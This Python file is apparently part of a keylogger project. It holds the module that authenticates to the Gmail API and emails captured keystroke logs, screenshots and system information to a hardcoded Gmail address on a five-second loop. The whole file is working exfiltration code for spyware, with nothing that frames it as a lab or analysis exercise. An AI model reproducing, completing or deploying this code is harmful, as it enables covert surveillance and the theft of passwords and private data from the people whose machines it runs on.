import os, pickle, socket, threading

from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage

from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request

from base64 import urlsafe_b64encode

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from mimetypes import guess_type as guess_mime_type

from pcInfo import info
from functions import keyloggerFn

iPc = info.infoPc()
keyloggerFn = keyloggerFn.keylogger()

class sndEmail:
    def __init__(self, destination = 'adrian.cristian.st@gmail.com', obj = 'Keylogger',
                 body = f'{iPc}', attachments = ["logs/log.txt", f"{socket.gethostname()}.png"]):
        self.__destination = destination
        self.__obj = obj
        self.__body = body
        self.__attachments = attachments

        self.scopes = ['https://mail.google.com/']

    @property
    def gmail_authenticate(self):
        creds = None
    
        if os.path.exists("token.pickle"):
            with open("token.pickle", "rb") as token:
                creds = pickle.load(token)
    
        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(
                    "credentials/credentials.json", self.scopes
                )
                creds = flow.run_local_server(port=0)
    
            with open("token.pickle", "wb") as token:
                pickle.dump(creds, token)
    
        return build("gmail", "v1", credentials=creds)


    def timeToSend(self):
        service = self.gmail_authenticate

        send_message(
            service,
            self.__destination,
            self.__obj,
            self.__body,
            self.__attachments,
        )

        timer = threading.Timer(5, self.timeToSend)
        timer.daemon = True
        timer.start()


def add_attachment(message: MIMEMultipart, filename: str):
    timer = threading.Timer(2, keyloggerFn.screenshot)
    timer.start()
    
    content_type, encoding = guess_mime_type(filename)

    if content_type is None or encoding is not None:
        content_type = 'application/octet-stream'
    main_type, sub_type = content_type.split('/', 1)

    if main_type == 'text':
        fp = open(filename, 'rb')
        msg = MIMEText(fp.read().decode(), _subtype=sub_type)
        fp.close()

    elif main_type == 'image':
        fp = open(filename, 'rb')
        msg = MIMEImage(fp.read(), _subtype=sub_type)
        fp.close()

    elif main_type == 'audio':
        fp = open(filename, 'rb')
        msg = MIMEAudio(fp.read(), _subtype=sub_type)
        fp.close()

    else:
        fp = open(filename, 'rb')
        msg = MIMEBase(main_type, sub_type)
        msg.set_payload(fp.read())
        fp.close()

    filename = os.path.basename(filename)
    msg.add_header('Content-Disposition', 'attachment', filename=filename)
    message.attach(msg)

def buildMsg(destination: str, obj: str, body: str, attachments: list[str]):
    if not attachments:
        message = MIMEText(body)
        message["to"] = destination
        message["from"] = destination
        message["subject"] = obj
    else:
        message = MIMEMultipart()
        message["to"] = destination
        message["from"] = destination
        message["subject"] = obj
        message.attach(MIMEText(body))

        for fl in attachments:
            add_attachment(message, fl)

    return {"raw": urlsafe_b64encode(message.as_bytes()).decode()}

def send_message(svr, destination: str, obj: str, body: str, attachments: list[str]) -> object:
    return (
        svr.users()
        .messages()
        .send(userId="me", body=buildMsg(destination, obj, body, attachments))
        .execute()
    )